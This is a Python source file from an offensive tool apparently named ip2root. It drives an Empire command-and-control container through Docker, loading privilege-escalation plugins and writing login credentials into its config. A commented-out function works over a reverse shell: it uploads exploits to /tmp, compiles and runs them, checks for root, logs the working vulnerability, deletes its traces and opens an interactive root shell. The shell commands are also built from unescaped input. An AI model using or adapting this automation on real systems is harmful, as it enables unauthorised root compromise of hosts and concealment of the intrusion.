import os
import docker
from time import sleep

def plugins(container_id: str, login_infos: list):
    '''
    Initial function to create plugins directory if it doesn't exist
    '''
    client = docker.from_env()
    empire_container = client.containers.get(container_id)
    check_plugin_directory = empire_container.exec_run('ls /plugins')
    if check_plugin_directory.exit_code == 2:
        empire_container.exec_run('mkdir /plugins')
        plugins_liste = list_plugins()
        load_plugins(plugins_liste, empire_container, container_id)
    test_plugins(empire_container, login_infos)
        
def list_plugins():
    '''
    List privesc plugins in ip2root's git repo
    '''
    plugins_liste = []
    directory = './plugins/privesc/'
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            plugins_liste.append(f)
    return plugins_liste

def load_plugins(plugins_liste: str, empire_container: object, container_id: str):
    '''
    Copy plugins in the docker
    '''
    empire_container.exec_run('rm /plugins/*')
    for plugin in plugins_liste:
        os.system('docker cp {0} {1}:/plugins/'.format(plugin, container_id))

def test_plugins(empire_container: object, login_infos: list):
    '''
    Test the privesc
    '''
    empire_container.exec_run('sed -i "s/username: .*/username: {0}/g" /empire/empire/client/config.yaml'.format(login_infos[0]))
    empire_container.exec_run('sed -i "s/password: .*/password: {0}/g" /empire/empire/client/config.yaml'.format(login_infos[1]))

'''def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromission_recap_file_name: str) -> None:
    """
    Run all available privesc plugins
    """
    print('[+] Identifying privesc capabilities')
    directory = './plugins/privesc/'
    counter = 1
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            print('[+] Uploading privesc script number {}'.format(counter))
            rsh = rs_client.RSH(sock)
            if '.sh' in f:
                ext = '.sh'
            elif '.c' in f:
                ext = '.c'
            rsh.upload('{0}'.format(f), '/tmp/exploit{0}{1}'.format(counter, ext))
            sock.send('cd /tmp\n')
            if ext == '.c':
                sock.send('gcc exploit{0}{1} -o exploit{0}\n'.format(counter, ext))
                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                sock.send('./exploit{0}\n'.format(counter, ext))
            elif ext == '.sh':
                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                sock.send("""python3 -c 'import pty; pty.spawn("/bin/bash")'\n""")
                sock.send('./exploit{0}{1}\n'.format(counter, ext))
            sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
            sleep(2)
            if rsh.file_exists('/tmp/valid_root') == True:
                print('[+] Privesc exploit worked !')
                if compromission_recap_file_name:
                    with open(compromission_recap_file_name, 'a') as report:
                        report.write('## Vulnerability used for privilege escalation\n`{}`\n'.format(f.split('/')[-1][:-3]))
                sleep(2)
                sock.send('rm /tmp/valid_root\n')
                sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
                shell.interact()
                sock.close()
                print('before if')
            else:
                print("")
                sock.send('rm /tmp/exploit*\n') 
            counter += 1'''